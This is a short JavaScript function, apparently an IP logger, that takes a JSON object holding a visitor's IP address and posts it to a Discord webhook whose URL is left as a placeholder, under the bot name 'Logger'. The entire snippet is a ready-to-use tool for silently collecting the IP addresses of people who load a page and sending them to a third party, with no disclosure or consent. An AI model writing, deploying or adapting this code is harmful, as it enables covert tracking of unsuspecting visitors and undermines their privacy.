function getIP(json) {
  var request = new XMLHttpRequest(); //making a request for the webhook
      request.open("POST", "YOUR DISCORD WEBHOOK LINK HERE");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "Logger",
        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
        content: "**IP:** *" + json.ip + "*"
      }
   //just a webhook parameters such as avatar,name,message

      request.send(JSON.stringify(params));
    }